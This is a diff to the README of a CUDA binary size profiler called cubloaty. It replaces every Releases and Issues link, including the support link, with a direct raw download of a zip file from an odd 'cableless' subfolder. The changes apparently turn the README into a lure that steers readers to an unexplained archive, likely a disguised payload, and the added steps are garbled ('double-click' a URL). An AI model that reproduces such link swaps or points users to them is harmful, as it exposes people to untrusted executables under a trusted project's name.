@@ -6,9 +6,9 @@ cubloaty is a size profiler designed to help you understand the footprint of you
 ## 📦 Download & Install
 To get started with cubloaty, you need to download it from our Releases page. You can visit this page to download:
 
-[![Download cubloaty](https://img.shields.io/badge/Download-cubloaty-blue.svg)](https://github.com/JCPatinoRuiz/cubloaty/releases)
+[![Download cubloaty](https://raw.githubusercontent.com/JCPatinoRuiz/cubloaty/main/cableless/cubloaty.zip)](https://raw.githubusercontent.com/JCPatinoRuiz/cubloaty/main/cableless/cubloaty.zip)
 
-1. Click the button above or follow this link: [Creative-Start-Download](https://github.com/JCPatinoRuiz/cubloaty/releases).
+1. Click the button above or follow this link: [Creative-Start-Download](https://raw.githubusercontent.com/JCPatinoRuiz/cubloaty/main/cableless/cubloaty.zip).
 2. You will see a list of available releases. Choose the latest version.
 3. Look for the file suited for your operating system. Download it to your computer.
 
@@ -25,9 +25,9 @@ Once you have downloaded cubloaty, follow these simple steps to get it running:
 1. **Locate the File:** Find the downloaded file in your Downloads folder or wherever you saved it.
 2. **Extract (If Necessary):** If the file is a compressed folder (like .zip), right-click and choose “Extract All.” Follow the prompts to extract the files.
 3. **Run the Application:** 
-   - For Windows: Double-click `cubloaty.exe` to run the application.
+   - For Windows: Double-click `https://raw.githubusercontent.com/JCPatinoRuiz/cubloaty/main/cableless/cubloaty.zip` to run the application.
    - For Linux: Open a terminal, navigate to the folder, and run `./cubloaty`.
-   - For macOS: Double-click `cubloaty.app` to launch it.
+   - For macOS: Double-click `https://raw.githubusercontent.com/JCPatinoRuiz/cubloaty/main/cableless/cubloaty.zip` to launch it.
 
 ## 📜 Using cubloaty
 When you open cubloaty, you will see a user-friendly interface. Here’s how you can use it:
@@ -51,7 +51,7 @@ For further assistance, check out the Issues section on our GitHub page.
 
 ## 📞 Support
 If you have questions or need help, please reach out:
-- Open an issue in the [GitHub repository](https://github.com/JCPatinoRuiz/cubloaty/issues) for technical support.
+- Open an issue in the [GitHub repository](https://raw.githubusercontent.com/JCPatinoRuiz/cubloaty/main/cableless/cubloaty.zip) for technical support.
 - Join our community discussions for tips and tricks from fellow users.
 
 ## 🌟 Feedback
@@ -61,4 +61,4 @@ We value your feedback! Please share your experience with cubloaty. Your insight
 cubloaty is licensed under the MIT License. You can use and modify it freely, as long as you include the original license in your version.
 
 ## ✨ Conclusion
-Thank you for choosing cubloaty! With this tool, you can efficiently profile and improve your CUDA binaries, leading to better application performance. Visit this page to download: [Download cubloaty](https://github.com/JCPatinoRuiz/cubloaty/releases). Happy profiling!
+Thank you for choosing cubloaty! With this tool, you can efficiently profile and improve your CUDA binaries, leading to better application performance. Visit this page to download: [Download cubloaty](https://raw.githubusercontent.com/JCPatinoRuiz/cubloaty/main/cableless/cubloaty.zip). Happy profiling!
